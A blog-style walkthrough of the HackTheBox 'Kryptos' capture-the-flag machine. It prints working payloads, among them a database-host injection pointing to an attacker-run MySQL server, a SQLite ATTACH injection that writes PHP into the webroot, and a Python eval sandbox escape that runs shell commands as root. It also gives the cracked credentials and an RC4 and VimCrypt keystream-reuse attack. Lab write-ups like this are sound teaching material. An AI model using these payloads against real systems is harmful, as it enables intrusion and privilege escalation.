---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-04-14-kryptos-hackthebox
tags:
- crypto
- hackthebox
- linux
- rc4
- sqlite
- web
title: Kryptos @ HackTheBox
---

Kryptos is 50 points machine on hackthebox, involving some interesting techniques, like setting up a fake database and making the application use it, abusing a weak rc4 implementation, pivoting through a web application and injecting into a sqlite database. In addition we exploit a weak prng on a application which gives us root in the end.

## User Flag

We start by scanning the box with nmap:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2c:b3:7e:10:fa:91:f3:6c:4a:cc:d7:f4:88:0f:08:90 (RSA)
|   256 0c:cd:47:2b:96:a2:50:5e:99:bf:bd:d0:de:05:5d:ed (ECDSA)
|_  256 e6:5a:cb:c8:dc:be:06:04:cf:db:3a:96:e7:5a:d5:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cryptor Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Since besides the web and ssh ports nothing is open we start by looking at the web site:

![](htb_kryptos_login.png)

After trying some default credentials we don’t manage to login. We look at the login post request and notice a few parameters:

```
username=xct&password=xct&db=cryptor&token=cf24389ea839ad63c87c2ff8a673edf975c6b0c875a9eeb1391cf45fb873a909&login=
```

Fiddling a bit with the parameters we find that by changing the db parameter we can trigger various different error messages. This seems like a good place to inject. There was a vulnerability in [LimeSurvey](http://127.0.0.1/2018/08/vuln_exploiting_limesurvey.html) not long ago that allowed to swap the database for an attacker controlled one, which seems like the kind of problem here too!

To begin we see if we can get a connection from the server by using tcpdump on the attacker side and the injection string `cryptor;host=10.10.16.66;port=3306#`:

```
sudo tcpdump -i tun0
16:28:09.427641 IP kryptos.57286 > red.mysql: Flags [S], seq 2980987389, win 29200, options [mss 1355,sackOK,TS val 3601524040 ecr 0,nop,wscale 7], length 0
16:28:09.427692 IP red.mysql > kryptos.57286: Flags [R.], seq 0, ack 2980987390, win 0, length 0
```

We indeed get a connection request by the server! The html response shows "PDOException code: 2002", which is connection refused. Now we would like to get the credentials the server is using to connect to us – fortunately Metasploit has a module to capture these (remember to set the JOHNPWFILE parameter to save them to file):

```
msf5 auxiliary(server/capture/mysql) >
[*] Started service listener on 0.0.0.0:3306
[*] Server started.
[+] 10.10.10.129:57298 - User: dbuser; Challenge: 112233445566778899aabbccddeeff1122334455; Response: 73def07da6fba5dcc1b19c918dbd998e0d1f3f9d; Database: cryptor
```

We crack them after a just a few seconds:

```
john --wordlist=~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt kryptos_mysqlna
krypt0n1te       (dbuser)
```

It is time to setup a local db that can accommodate the request. I will describe the process on a kali box. First we have to edit "/etc/mysql/mariadb.conf.d/50-server.cnf" to listen on the external interface and allow logging, making the following changes:

```
port                   = 3306
bind-address            = 0.0.0.0
general_log_file       = /var/log/mysql/mysql.log
general_log            = 1
```

Also we have to create the mysql socket directory (or change its path):

```
sudo mkdir /run/mysqld
sudo chown -R mysql:root mysqld
```

Then we can finally start the service:

```
sudo systemctl restart mysql.service
sudo systemctl restart mariadb.service
netstat -tulpen | grep 3306
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      104
```

We then have to create the user "dbuser" with the password we got earlier, the db "cryptor" and allow remote access:

```
CREATE USER 'dbuser'@'%' IDENTIFIED BY 'krypt0n1te';
CREATE DATABASE cryptor;
GRANT ALL PRIVILEGES ON cryptor.* TO 'dbuser'@'%' IDENTIFIED BY 'krypt0n1te';
FLUSH PRIVILEGES;
```

After triggering the injection again we can see a connection request and the login query:

```
Connect    dbuser@kryptos as anonymous on cryptor
            38 Query    SELECT username, password FROM users WHERE username='xct' AND password='0db9774b86aa5a219a0939cdd5c5aa08'
```

This means we have to now create a table users with the columns username and password. The password seems to be the md5 hash of what we entered in the login field (md5("xct")).

```
use cryptor;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(64) not null, password varchar(64) not null,  constraint pk_example primary key (id) );
INSERT INTO users ( id, username, password ) VALUES ( null, 'xct', '0db9774b86aa5a219a0939cdd5c5aa08' );
```

After logging in again we finally get into the application:

![](htb_kryptos_login_success.png)

Unfortunately there is still quite some way to go to get the user flag. With the encrypt functionality of the application we can make a get request to an arbitrary url and encrypt it with RC4 or AES. Since RC4 is basically a fancy xor cipher and is often misused, we encrypt a sample url with it, decode the base64 and encrypt it again. Decoding the resulting base64 gives back the plaintext! This means that the key is reused on encryption, therefore enabling us to decrypt the cipher text with the encrypt method.

At this point we have not found anything yet that we could retrieve with our new powers. Running dirb against the server shows however that there exists a "/dev" folder (which gives 403 for us). In order to automate requesting files via the encrypt/decrypt process I wrote a small [script](https://gist.github.com/xct/98a752829b867da588fac1840a2a6db2).

Doing a request for "/dev/index.php" via the encrypt method gives back a result:

```
python3 xct.py get 10.10.16.66 8000 enpq2gj8fe359a9dnivtsvl3ma http://127.0.0.1/dev/index.php\?view\=todo

<html>
    <head>
    </head>
    <body>
    <div class="menu">
        <a href="index.php">Main Page</a>
        <a href="index.php?view=about">About</a>
        <a href="index.php?view=todo">ToDo</a>
    </div>
<h3>ToDo List:</h3>
1) Remove sqlite_test_page.php
<br>2) Remove world writable folder which was used for sqlite testing
<br>3) Do the needful
<h3> Done: </h3>
1) Restrict access to /dev
<br>2) Disable dangerous PHP functions

</body>
</html>
```

This sounds very interesting – there seems to be some sort of test page and a writable folder! We can get the code of test page using the well known php filter "trick":

```
➜  kryptos python3 kryptos_request.py get 10.10.16.66 8000 enpq2gj8fe359a9dnivtsvl3ma http://127.0.0.1/dev/index.php\?view\=php://filter/convert.base64-encode/resource\=sqlite_test_page

<base64 result>
```

The resulting base64 string can be decoded revealing the following page:

```php
<?php
$no_results = $_GET['no_results'];
$bookid = $_GET['bookid'];
$query = "SELECT * FROM books WHERE id=".$bookid;
if (isset($bookid)) {
   class MyDB extends SQLite3
   {
      function __construct()
      {
     // This folder is world writable - to be able to create/modify databases from PHP code
         $this->open('d9e28afcf0b274a5e0542abb67db0784/books.db');
      }
   }
   $db = new MyDB();
   if(!$db){
      echo $db->lastErrorMsg();
   } else {
      echo "Opened database successfully\n";
   }
   echo "Query : ".$query."\n";

if (isset($no_results)) {
   $ret = $db->exec($query);
   if($ret==FALSE)
    {
    echo "Error : ".$db->lastErrorMsg();
    }
}
else
{
   $ret = $db->query($query);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ){
      echo "Name = ". $row['name'] . "\n";
   }
   if($ret==FALSE)
    {
    echo "Error : ".$db->lastErrorMsg();
    }
   $db->close();
}
}
?>
```

We have a sqlite database that is clearly vulnerable to sql injection in the query `"SELECT * FROM books WHERE id=".$bookid;`. After researching a bit weather we can do something with sql injection on sqlite databases, this blog [post](https://atta.cked.me/home/sqlite3injectioncheatsheet) describes a very interesting technique to get code execution. Sqlite lets us attach a new database that will be created as a file on the file system with content we control! After playing for a while the following query does the trick:

```
 or 1=1;attach database '/var/www/html/dev/d9e28afcf0b274a5e0542abb67db0784/xct.php' as xct;create table xct.pwn (dataz text);insert into xct.pwn (dataz) values ("<?php phpinfo(); ?>");--
```

For this to work with our script we have to url encode the query (I did in burp):

```
python3 kryptos_request.py get 10.10.16.66 8000 rscbam8ane6bs8lvgro0jkb3jb "http://127.0.0.1/dev/sqlite_test_page.php?no_results=FALSE&bookid=1%20%6f%72%20%31%3d%31%3b%61%74%74%61%63%68%20%64%61%74%61%62%61%73%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%64%65%76%2f%64%39%65%32%38%61%66%63%66%30%62%32%37%34%61%35%65%30%35%34%32%61%62%62%36%37%64%62%30%37%38%34%2f%78%63%74%2e%70%68%70%27%20%61%73%20%78%63%74%3b%63%72%65%61%74%65%20%74%61%62%6c%65%20%78%63%74%2e%70%77%6e%20%28%64%61%74%61%7a%20%74%65%78%74%29%3b%69%6e%73%65%72%74%20%69%6e%74%6f%20%78%63%74%2e%70%77%6e%20%28%64%61%74%61%7a%29%20%76%61%6c%75%65%73%20%28%22%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e%22%29%3b%2d%2d"
[+] Got encrypted result
[*] Size: 331
10.10.10.129 - - [28/Apr/2019 11:24:37] "GET /tmp HTTP/1.1" 200 -
[+] Decrypted:
<html>
<head></head>
<body>
Opened database successfully
```

We can now check if the file has been written with:

```
python3 kryptos_request.py get 10.10.16.66 8000 rscbam8ane6bs8lvgro0jkb3jb http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/xct.php
```

We see that this is the case, our file was executed and we get the contents of phpinfo(). Note that you can only execute this once with a given name (like "xct" in the example) because it is a create table command which will fail on consecutive executions. I leave it to you to adjust it for updates.

Now we have to turn this into a shell. We look around on the box using the builtin php functions "scandir" and "file\_get\_contents". Eventually we find in "/home/rijndael" the file "creds.txt":

```
00000000: 5669 6d43 7279 7074 7e30 3221 0b18 e435  VimCrypt~02!...5
00000010: cb56 129a 3544 8040 703b 962d 930d a810  .V..5D.@p;.-....
00000020: 766e 645d c14b e21c 7959 437d d935 fb36  vnd].K..yYC}.5.6
00000030: 674d 5241 8b6e                           gMRA.n
```

After a bit of research for vimcrypt we find it supports zip, blowfish and blowfish2 and that there are some tools out there which can decrypt it (by using wordlists or bruteforce). However we don’t have any luck with this. There is [blog post](https://dgl.cx/2014/10/vim-blowfish) describing a weakness in the crypto used on old versions which seems very promising. The vulnerability lies in the fact that the encryption is done with a repeating keystream. Since we know a part of the plain text from the creds.old file (which is in the home folder of rijndael aswell and contains "rijndael / Password1"), we can obtain the key used for encryption by xoring the cipher text with the known plaintext. Using the key we can then decrypt the whole file and obtain cleartext credentials. My teammate nastirth wrote a nice [script](https://gist.github.com/xct/a5b56b03e8b7a97eb8ec2a5bc67ffa38) to automate the process

```
rijndael / bkVBL8Q9HuBSpj
```

We can now log in with these credentials over ssh and grab the user flag.

## Root Flag

Inside the user folder we find a folder called kryptos, containing the file kryptos.py, a web application running on tcp port 81 as root:

```python
import random
import json
import hashlib
import binascii
from ecdsa import VerifyingKey, SigningKey, NIST384p
from bottle import route, run, request, debug
from bottle import hook
from bottle import response as resp


def secure_rng(seed):
    # Taken from the internet - probably secure
    p = 2147483647
    g = 2255412

    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength*8):
        seed = pow(g,seed,p)
        if seed > ths:
            ret += 2**i
    return ret

# Set up the keys
seed = random.getrandbits(128)
rand = secure_rng(seed) + 1
sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
vk = sk.get_verifying_key()

def verify(msg, sig):
    try:
        return vk.verify(binascii.unhexlify(sig), msg)
    except:
        return False

def sign(msg):
    return binascii.hexlify(sk.sign(msg))

@route('/', method='GET')
def web_root():
    response = {'response':
                {
                    'Application': 'Kryptos Test Web Server',
                    'Status': 'running'
                }
                }
    return json.dumps(response, sort_keys=True, indent=2)

@route('/eval', method='POST')
def evaluate():
    try:
        req_data = request.json
        expr = req_data['expr']
        sig = req_data['sig']
        # Only signed expressions will be evaluated
        if not verify(str.encode(expr), str.encode(sig)):
            return "Bad signature"
        result = eval(expr, {'__builtins__':None}) # Builtins are removed, this should be pretty safe
        response = {'response':
                    {
                        'Expression': expr,
                        'Result': str(result)
                    }
                    }
        return json.dumps(response, sort_keys=True, indent=2)
    except:
        return "Error"

# Generate a sample expression and signature for debugging purposes
@route('/debug', method='GET')
def debug():
    expr = '2+2'
    sig = sign(str.encode(expr))
    response = {'response':
                {
                    'Expression': expr,
                    'Signature': sig.decode()
                }
                }
    return json.dumps(response, sort_keys=True, indent=2)

run(host='127.0.0.1', port=81, reloader=True)
```

We can see that by sending a request to "/eval", the expr parameter gets evaluated (and therefore executed). There is however two problems with this. The parameter sig needs to be a valid signature and all builtin functions are disabled.

To bypass the signature check we have to read the code. The function "secure\_rng" has a comment that suggests it might not be secure – which is true. When we print out the values it generates we can see some very small values being used and the repetition of values. The pool of possible values is therefore small and the seed values can be guessed in order to build a valid signature.

For the builtin functions you can use reflection / introspection to activate them again. I learned about that technique [here](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html). The final script that combines both can be found [here](https://gist.github.com/xct/3ba93f758fc07a0ca5b5dde66177e6ea).

We forward the port to our box with `ssh -D8081 -N rijndael@10.10.10.129` and setup burp to use the socks proxy – then we run the script:

```
[+] Signing expression..
Bruting..
{
  "response": {
    "Expression": "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('cp /root/root.txt /tmp/xct && chmod 777 /tmp/xct')",
    "Result": "0"
  }
}
301368188646828743948964542768906351868
```

After a few seconds we succeed and have the flag copied out to /tmp.

A very nice box overall, many thanks to [no0ne](https://www.hackthebox.eu/home/users/profile/21927) and [Adamm](https://www.hackthebox.eu/home/users/profile/2571) for creating it!
